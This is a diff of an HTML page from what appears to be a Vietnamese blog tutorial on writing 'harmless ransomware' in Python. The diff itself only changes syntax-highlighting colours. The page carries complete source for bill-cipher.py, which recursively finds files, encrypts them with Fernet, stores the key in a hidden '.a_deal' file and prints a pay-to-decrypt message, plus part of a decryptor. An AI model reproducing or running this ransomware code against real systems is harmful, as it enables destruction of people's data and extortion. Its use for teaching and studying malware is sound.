@@ -23,7 +23,7 @@
 
 
 
-  <link rel="stylesheet" href="/main.min.244183cde1a38e0b08f82c11791181288f9aac1cc9618cd6f4e9e7710c5768ba.css" integrity="sha256-JEGDzeGjjgsI&#43;CwReRGBKI&#43;arBzJYYzW9OnncQxXaLo=" crossorigin="anonymous">
+  <link rel="stylesheet" href="/main.min.07ea7ac7da67e2e153a7dfa2457bc6a19cca824288d175e223fadc579041bc51.css" integrity="sha256-B&#43;p6x9pn4uFTp9&#43;iRXvGoZzKgkKI0XXiI/rcV5BBvFE=" crossorigin="anonymous">
 
 
 
@@ -225,96 +225,96 @@
 <hr>
 <h2 id="môi-trường-lập-trình">Môi trường lập trình</h2>
 <p>Mình cần dùng <em>thư viện mã hóa</em> trong Python để mã hóa và giải mã các file mình tìm đc. Mình sử dụng thư viện có tên là <code>cryptography</code> và chúng ta có thể tải thư viện này bằng <code>pip</code>.</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install cryptography
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>pip install cryptography
 </span></span></code></pre></div><hr>
 <h2 id="cách-tìm-và-mã-hóa-file">Cách tìm và mã hóa file</h2>
 <p>Thế làm thế nào để mình mã hóa hết các file trên máy? Đầu tiên thì mình phải tìm được hết các file trên máy tính. Mình sử dụng thư viện <code>os</code> của Python để tìm file. Mình cũng sẽ sử dụng thuật toán <em>Fernet</em> ở trong thư viện mã hóa mình vừa cài để mã hóa các file.</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.fernet <span style="color:#f92672">import</span> Fernet
 </span></span></code></pre></div><p>Chúng ta lưu các file trên máy mà chúng ta tìm được trong 1 danh sách gọi là <code>files</code>.</p>
 <p>Chúng ta cần check xem cái &ldquo;file&rdquo; đó là 1 file bình thường hay là 1 folder. Chúng ta có thể dùng hàm <code>os.path.isfile()</code> để check. Nếu như &ldquo;file&rdquo; đó không phải là file mà là folder thì chúng ta cần đi vào trong folder đó và check các file trong folder đó. Nếu folder đó có folder thì sẽ tiếp tục vào folder trong folder đó.</p>
 <p>Sau khi chúng ta tìm đường dẫn của các file, chúng ta sẽ lưu đường dẫn tới các file đó trong danh sách <code>files</code>.</p>
 <p>Chúng ta cũng cần tránh không lưu chương trình mã hóa, giải mã và key của mình trong lúc tìm kiếm file bởi vì nếu như chúng ta mã hóa file giải mã và file key thì sau này sẽ không giải mã các file được.</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e"># bill-cipher.py</span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
-</span></span><span style="display:flex;"><span>    <span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e"># bill-cipher.py</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_files</span>():
+</span></span><span style="display:flex;"><span>    files <span style="color:#f92672">=</span> []
 </span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
-</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir():
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-cipher.py&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;.a_deal&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-decipher.py&#34;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
 </span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
-</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
-</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
-</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
+</span></span><span style="display:flex;"><span>			files<span style="color:#f92672">.</span>append(file)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(file)
+</span></span><span style="display:flex;"><span>			sub_files <span style="color:#f92672">=</span> find_files()
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#34;..&#34;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> subfile <span style="color:#f92672">in</span> sub_files:
+</span></span><span style="display:flex;"><span>				path <span style="color:#f92672">=</span> file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> subfile
+</span></span><span style="display:flex;"><span>				files<span style="color:#f92672">.</span>append(path)
 </span></span><span style="display:flex;"><span>			
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> files
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> find_files()
 </span></span></code></pre></div><p>Tiếp theo, chúng ta cần tạo key để mã hóa các file chương trình của mình đã tìm được. Key này sẽ được lưu trong <code>.a_deal</code> (mình lưu trong file thế này bởi vì các file có chấm ở đầu tên file sẽ được ẩn trên các hệ thống Unix).</p>
 <p>Sau khi chúng ta tạo key thì chúng ta sẽ cần mở các file bằng đường dẫn mình lưu trong <code>files</code>, đọc file và mã hóa nội dung mình đọc được từ file, rồi viết nội dung đã mã hóa vào lại file. Mình đọc và viết ở chế độ nhị phân bởi vì thuật toán Fernet được dùng cho nhị phân.</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>key <span style="color:#f92672">=</span> Fernet<span style="color:#f92672">.</span>generate_key()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;.a_deal&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> deal:
+</span></span><span style="display:flex;"><span>	deal<span style="color:#f92672">.</span>write(key)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
-</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>		content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
+</span></span><span style="display:flex;"><span>	content_encrypted <span style="color:#f92672">=</span> Fernet(key)<span style="color:#f92672">.</span>encrypt(content)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
-</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(content_encrypted)
 </span></span></code></pre></div><p>Thế là xong chương trình mã hóa file (<code>bill-cipher.py</code>). Đây là code cho chương trình mã hóa này:</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/local/bin/python3 </span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.fernet <span style="color:#f92672">import</span> Fernet
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_files</span>():
+</span></span><span style="display:flex;"><span>	files <span style="color:#f92672">=</span> []
 </span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-cipher.py&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;.a_deal&#34;</span> <span style="color:#56b6c2">or</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">==</span> <span style="color:#98c379">&#34;bill-decipher.py&#34;</span>:
-</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">continue</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> os<span style="color:#f92672">.</span>listdir():
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-cipher.py&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;.a_deal&#34;</span> <span style="color:#f92672">or</span> file <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;bill-decipher.py&#34;</span>:
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">continue</span>
 </span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">if</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">path</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">isfile</span>(<span style="color:#e06c75">file</span>):
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">file</span>)
-</span></span><span style="display:flex;"><span>		<span style="color:#c678dd">else</span>:
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#e06c75">file</span>)
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">sub_files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
-</span></span><span style="display:flex;"><span>			<span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">chdir</span>(<span style="color:#98c379">&#34;..&#34;</span>)
-</span></span><span style="display:flex;"><span>			<span style="color:#c678dd">for</span> <span style="color:#e06c75">subfile</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">sub_files</span>:
-</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">path</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">+</span> <span style="color:#98c379">&#34;/&#34;</span> <span style="color:#56b6c2">+</span> <span style="color:#e06c75">subfile</span>
-</span></span><span style="display:flex;"><span>				<span style="color:#e06c75">files</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">append</span>(<span style="color:#e06c75">path</span>)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">if</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>isfile(file):
+</span></span><span style="display:flex;"><span>			files<span style="color:#f92672">.</span>append(file)
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(file)
+</span></span><span style="display:flex;"><span>			sub_files <span style="color:#f92672">=</span> find_files()
+</span></span><span style="display:flex;"><span>			os<span style="color:#f92672">.</span>chdir(<span style="color:#e6db74">&#34;..&#34;</span>)
+</span></span><span style="display:flex;"><span>			<span style="color:#66d9ef">for</span> subfile <span style="color:#f92672">in</span> sub_files:
+</span></span><span style="display:flex;"><span>				path <span style="color:#f92672">=</span> file <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;/&#34;</span> <span style="color:#f92672">+</span> subfile
+</span></span><span style="display:flex;"><span>				files<span style="color:#f92672">.</span>append(path)
 </span></span><span style="display:flex;"><span>			
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">return</span> <span style="color:#e06c75">files</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> files
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">find_files</span>()
+</span></span><span style="display:flex;"><span>files <span style="color:#f92672">=</span> find_files()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#e06c75">files</span>)
+</span></span><span style="display:flex;"><span>print(files)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">generate_key</span>()
+</span></span><span style="display:flex;"><span>key <span style="color:#f92672">=</span> Fernet<span style="color:#f92672">.</span>generate_key()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">key</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;.a_deal&#34;</span>, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> deal:
+</span></span><span style="display:flex;"><span>	deal<span style="color:#f92672">.</span>write(key)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
-</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>		content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_encrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">encrypt</span>(<span style="color:#e06c75">content</span>)
+</span></span><span style="display:flex;"><span>	content_encrypted <span style="color:#f92672">=</span> Fernet(key)<span style="color:#f92672">.</span>encrypt(content)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
-</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_encrypted</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(content_encrypted)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#e5c07b">print</span>(<span style="color:#98c379">&#34;File đã bị mã hóa! Trả tiền thì sẽ giải mã&#34;</span>)
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;File đã bị mã hóa! Trả tiền thì sẽ giải mã&#34;</span>)
 </span></span></code></pre></div><p>Nếu như mình chạy file <code>bill-cipher.py</code> thì có thể thấy là các file mà chương trình này tìm được sẽ bị mã hóa và trở thành file chứa 1 đống chữ cái, ký tự random.</p>
 <p><img src="/img/harmless-ransomware/file1-encrypted.png" alt="file1-encrypted"></p>
 <p>Chương trình này cũng có thể mã hóa file ảnh và video nữa.</p>
@@ -324,59 +324,59 @@
 <h2 id="cách-giải-mã">Cách giải mã</h2>
 <p>Để giải mã các file bị mã hóa, chúng ta sẽ cần tìm các file đó trước. Thế nên chúng ta sẽ dùng đoạn code tìm file của chương trình mã hóa trên.</p>
 <p>Sau khi tìm được file, chúng ta cần đọc key trong <code>.a_deal</code> để giải mã các file bị mã hóa bằng key này.</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#98c379">&#34;.a_deal&#34;</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">deal</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">key</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">deal</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;.a_deal&#34;</span>, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> deal:
+</span></span><span style="display:flex;"><span>	key <span style="color:#f92672">=</span> deal<span style="color:#f92672">.</span>read()
 </span></span></code></pre></div><p>Chúng ta sẽ đọc nội dung file ở chế độ nhị phân, giải mã bằng key trong <code>.a_deal</code> và viết nội dung đã giải mã vào lại file đó.</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">files</span>:
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;rb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
-</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">content</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">read</span>()
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#66d9ef">for</span> file <span style="color:#f92672">in</span> files:
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;rb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>		content <span style="color:#f92672">=</span> f<span style="color:#f92672">.</span>read()
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">content_decrypted</span> <span style="color:#56b6c2">=</span> <span style="color:#e06c75">Fernet</span>(<span style="color:#e06c75">key</span>)<span style="color:#56b6c2">.</span><span style="color:#e06c75">decrypt</span>(<span style="color:#e06c75">content</span>)
+</span></span><span style="display:flex;"><span>	content_decrypted <span style="color:#f92672">=</span> Fernet(key)<span style="color:#f92672">.</span>decrypt(content)
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">with</span> <span style="color:#e5c07b">open</span>(<span style="color:#e06c75">file</span>, <span style="color:#98c379">&#34;wb&#34;</span>) <span style="color:#c678dd">as</span> <span style="color:#e06c75">f</span>:
-</span></span><span style="display:flex;"><span>		<span style="color:#e06c75">f</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">write</span>(<span style="color:#e06c75">content_decrypted</span>)
+</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">with</span> open(file, <span style="color:#e6db74">&#34;wb&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>		f<span style="color:#f92672">.</span>write(content_decrypted)
 </span></span></code></pre></div><p>Thế là xong chương trình giải mã file (<code>bill-cipher.py</code>). Đây là code cho chương trình giải mã này:</p>
-<div class="highlight"><pre tabindex="0" style="color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#7f848e">#!/usr/local/bin/python3 </span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/local/bin/python3 </span>
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">import</span> <span style="color:#e06c75">os</span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">from</span> <span style="color:#e06c75">cryptography.fernet</span> <span style="color:#c678dd">import</span> <span style="color:#e06c75">Fernet</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> cryptography.fernet <span style="color:#f92672">import</span> Fernet
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#c678dd">def</span> <span style="color:#61afef;font-weight:bold">find_files</span>():
-</span></span><span style="display:flex;"><span>	<span style="color:#e06c75">files</span> <span style="color:#56b6c2">=</span> []
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">find_files</span>():
+</span></span><span style="display:flex;"><span>	files <span style="color:#f92672">=</span> []
 </span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	<span style="color:#c678dd">for</span> <span style="color:#e06c75">file</span> <span style="color:#56b6c2">in</span> <span style="color:#e06c75">os</span><span style="color:#56b6c2">.</span><span style="color:#e06c75">listdir</span>():
